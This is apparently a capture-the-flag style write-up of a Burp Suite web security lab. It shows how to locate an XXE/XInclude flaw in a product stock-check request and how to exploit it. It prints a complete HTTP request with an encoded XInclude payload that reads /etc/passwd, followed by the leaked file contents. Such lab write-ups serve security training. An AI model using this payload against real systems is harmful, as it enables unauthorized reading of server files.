## Discovering vulnerabilities quickly with targeted scanning

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of /etc/passwd within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a targeted scan on a specific request. Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

Hint :

If you get stuck, try looking up our Academy topic on the identified vulnerability class.

## Notes

- /resources/js/stockCheck.js
- /product/stock


## Resume

1. Run active scan
2. Identify the XXE
3. XXE Include to read `/etc/passwd`

## Solve

Open the lab and inspect the application for requests that look like they process server-side data. The `stock check` feature is the best candidate, and the JavaScript file at `/resources/js/stockCheck.js` helps confirm the request format.

Send the `POST /product/stock` request to Burp Scanner and run an active scan against that specific request. The scanner should identify an XML-processing issue and point to the `productId` parameter as the attack vector.

Once the XXE/XInclude issue is confirmed, replace the `productId` value with an XInclude payload that reads a local file:

```http
POST /product/stock HTTP/2
Host: 0ab900a703e98afa81b7a39400e50042.web-security-academy.net
Cookie: session=BaOLiCJZfIt1DNSbN98h7KdTN6j1m47h
Content-Type: application/x-www-form-urlencoded
Origin: https://0ab900a703e98afa81b7a39400e50042.web-security-academy.net
Referer: https://0ab900a703e98afa81b7a39400e50042.web-security-academy.net/product?productId=1

productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
```

The server processes the XML and returns the contents of `/etc/passwd` in the response body.

output:

```http
Invalid product ID: root:x:0:0:root:/root:/bin/bash
...
carlos:x:12002:12002::/home/carlos:/bin/bash
```


